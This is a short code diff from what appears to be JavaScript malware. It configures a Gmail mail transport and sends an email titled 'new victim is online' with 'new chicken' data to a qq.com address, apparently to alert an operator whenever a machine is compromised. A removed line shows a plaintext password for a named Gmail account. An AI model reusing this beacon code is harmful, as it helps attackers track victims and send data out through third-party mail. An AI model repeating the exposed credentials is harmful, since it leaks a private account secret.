@@ -34,10 +34,9 @@
 		    service:"Gmail",
 		    auth: {
 		        user: 'overkazaf@gmail.com',
-		        pass: 'overkazaf89)!!&'
+		        pass: 'xxx'
 		    }
 		});
-		console.log(transporter);
 
 		var json = {
 			test : 'hello'
@@ -45,7 +44,7 @@
 
 		var mail = {
 			from : 'overkazaf@gmail.com',
-		    to: '87935213@qq.com',
+		    to: '289202839@qq.com',
 		    subject: 'new victim is online',
 		    text: 'new chicken - >' + JSON.stringify(json)
 		};
